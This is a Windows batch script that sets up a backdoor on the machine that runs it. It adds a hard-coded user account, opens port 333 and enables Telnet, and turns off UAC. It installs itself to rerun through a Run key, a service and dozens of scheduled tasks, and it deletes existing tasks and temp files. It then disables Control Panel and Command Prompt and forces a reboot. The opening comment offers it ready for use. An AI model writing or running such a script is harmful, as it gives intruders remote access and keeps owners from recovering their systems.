:: Make sure to change the username and password wherver necessary
@ECHO OFF
del /q/f/s %TEMP%\*
color a
:: Set User Account and Password
net user Rick S4nch3zc147 /add
::Open Port 333
netsh firewall add portopening TCP 333
netsh firewall add portopening UDP 333
sc config tlntsvr start= auto
:: Alternative method to start Telnet 
net start telnet
:: Enabled Forced UAC Permission
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
:: Enabled kilo.bat Run at Startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v kilo /t REG_EXPAND_SZ /d "c:\Windows\System32\kilo.bat" /f
:: Disabled Control Panel
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f 
:: Created Persistent Service
sc create kiloSRV DisplayName= "kilo SERVICE" start= auto binpath= "C:\Windows\System32\kilo.bat" 
:: Delete all Previously Scheduled Tasks
schtasks /delete /tn * /f
:: Deleted all Previously Scheduled Tasks XP
at /delete /yes
:: Scheduled Task for 7+ (Reruns every minute)
schtasks /create /sc minute /mo 1 /tn "kilo" /tr "c:\Windows\System32\kilo.bat"
:: Created Scheduled Task (Reruns This Batch Every 5 min) 
at 17:00 "C:\Windows\System32\kilo.bat"
at 17:05 "C:\Windows\System32\kilo.bat"
at 17:10 "C:\Windows\System32\kilo.bat"
at 17:15 "C:\Windows\System32\kilo.bat"
at 17:20 "C:\Windows\System32\kilo.bat"
at 17:25 "C:\Windows\System32\kilo.bat"
at 17:30 "C:\Windows\System32\kilo.bat"
at 17:35 "C:\Windows\System32\kilo.bat"
at 17:40 "C:\Windows\System32\kilo.bat"
at 17:45 "C:\Windows\System32\kilo.bat"
at 17:50 "C:\Windows\System32\kilo.bat"
at 17:55 "C:\Windows\System32\kilo.bat"
at 18:00 "C:\Windows\System32\kilo.bat"
at 18:05 "C:\Windows\System32\kilo.bat"
at 18:10 "C:\Windows\System32\kilo.bat"
at 18:15 "C:\Windows\System32\kilo.bat"
at 18:20 "C:\Windows\System32\kilo.bat"
at 18:25 "C:\Windows\System32\kilo.bat"
at 18:30 "C:\Windows\System32\kilo.bat"
at 18:35 "C:\Windows\System32\kilo.bat"
at 18:40 "C:\Windows\System32\kilo.bat"
at 18:45 "C:\Windows\System32\kilo.bat"
at 18:50 "C:\Windows\System32\kilo.bat"
at 18:55 "C:\Windows\System32\kilo.bat"
at 19:00 "C:\Windows\System32\kilo.bat"
at 19:05 "C:\Windows\System32\kilo.bat"
at 19:10 "C:\Windows\System32\kilo.bat"
at 19:15 "C:\Windows\System32\kilo.bat"
at 19:20 "C:\Windows\System32\kilo.bat"
at 19:25 "C:\Windows\System32\kilo.bat"
at 19:30 "C:\Windows\System32\kilo.bat"
at 19:35 "C:\Windows\System32\kilo.bat"
at 19:40 "C:\Windows\System32\kilo.bat"
at 19:45 "C:\Windows\System32\kilo.bat"
at 19:50 "C:\Windows\System32\kilo.bat"
at 19:55 "C:\Windows\System32\kilo.bat"
at 20:00 "C:\Windows\System32\kilo.bat"
at 20:05 "C:\Windows\System32\kilo.bat"
at 20:10 "C:\Windows\System32\kilo.bat"
at 20:15 "C:\Windows\System32\kilo.bat"
at 20:20 "C:\Windows\System32\kilo.bat"
at 20:25 "C:\Windows\System32\kilo.bat"
at 20:30 "C:\Windows\System32\kilo.bat"
at 20:35 "C:\Windows\System32\kilo.bat"
at 20:40 "C:\Windows\System32\kilo.bat"
at 20:45 "C:\Windows\System32\kilo.bat"
at 20:50 "C:\Windows\System32\kilo.bat"
at 20:55 "C:\Windows\System32\kilo.bat"
:: Disabled Command Prompt
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
:: Restart
shutdown /t 300 /r






